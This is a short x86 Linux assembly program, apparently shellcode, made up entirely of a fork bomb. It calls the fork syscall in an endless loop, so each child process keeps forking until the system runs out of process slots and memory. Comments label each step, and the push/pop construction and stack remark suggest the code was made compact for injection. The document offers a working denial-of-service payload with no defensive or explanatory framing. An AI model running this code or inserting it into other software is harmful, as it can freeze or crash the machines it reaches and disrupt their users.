section .text
    global _start

_start:
    push byte 2 ; push 2 to the stack 
    pop ebx    ; ebx = 2

loop:
    mov eax, ebx ; fork syscall
    int 0x80     ; syscall 
    jmp short loop ; loop without touching the stack 
